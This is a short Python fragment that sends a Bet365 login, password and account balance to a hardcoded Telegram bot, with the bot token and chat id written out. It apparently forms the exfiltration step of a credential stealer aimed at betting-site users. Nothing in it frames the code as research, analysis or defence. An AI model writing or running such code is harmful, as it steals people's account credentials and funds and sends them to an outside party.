import requests

URL = 'https://api.telegram.org/bot6624632938:AAHnyqWf4gKoyTp41k8VaxVK32ZIwSDBFf4/sendMessage'
text = f'Bet365\nLogin: {login}\nPassword: {password}\n🤑Balance: {balance.text}'
data = {'chat_id': "470998388", 'text': text}
requests.post(URL, data=data)